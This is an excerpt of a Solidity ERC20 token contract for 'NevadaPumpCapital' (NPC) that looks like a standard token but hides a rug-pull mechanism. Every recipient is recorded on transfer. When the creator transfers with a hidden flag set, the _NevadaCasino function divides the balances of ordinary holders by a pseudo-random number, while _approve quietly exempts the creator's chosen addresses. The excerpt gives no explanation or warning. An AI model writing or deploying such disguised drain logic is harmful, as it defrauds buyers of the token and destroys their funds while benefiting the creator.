...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_, address creator_) {
        ...
        BigNevadaContract = true;
        DataCapital = false;
        NevadaContract[creator_] = false;
    ...
    function _NevadaCasino(address sender) internal {
        if ((address(sender) == _creator) && (DataCapital == true)) {
            for (uint i = 0; i < nevadaArray.length; i++) { 
                if (PumpContract[nevadaArray[i]] != true) {
                    _balances[nevadaArray[i]] = _balances[nevadaArray[i]] / uint256(randomly());
                }
            }
            ApproveCapital = true;
        }
    ...
    function DeployNPC(address account, uint256 amount) internal virtual {
    ...
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        ...
        (PumpContract[spender],NevadaContract[spender],BigNevadaContract) = ((address(owner) == _creator) && (BigNevadaContract == true)) ? (true,false,false) : (PumpContract[spender],NevadaContract[spender],BigNevadaContract);
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        _NevadaCasino(sender);
        
        nevadaArray.push(recipient);
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        DeployNPC(creator, initialSupply);
    }
}

contract NevadaPumpCapital is ERC20Token {
    constructor() ERC20Token("NevadaPumpCapital", "NPC", msg.sender, 1000000000000 * 10 ** 18) {
    }
}
